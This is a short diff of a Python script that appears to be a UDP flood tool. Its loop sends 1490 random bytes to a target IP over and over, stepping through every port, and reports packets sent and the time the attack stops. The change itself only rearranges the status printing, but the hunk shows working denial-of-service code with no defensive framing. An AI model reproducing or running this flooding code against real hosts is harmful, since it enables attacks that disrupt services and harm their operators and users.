@@ -56,12 +56,12 @@ ibytes = random._urandom(1490)
 while True:
             now = datetime.now()
             nowminute = now.minute
-            print('Stop attack in %s:%s'%(hour,stopminute))
+           ## print('Stop attack in %s:%s'%(hour,stopminute))
             port = port + 1
             sock.sendto(ibytes, (ip,port))
             sent = sent + 1
             stopattack = mil - sent 
-            print('     [pack %s] remained %s'%(sent,stopattack))
+            print('     [pack %s] remained %s'%(sent,stopattack),'Stop attack in %s:%s'%(hour,stopminute))
             
             if port == 65534:
                         port = 1
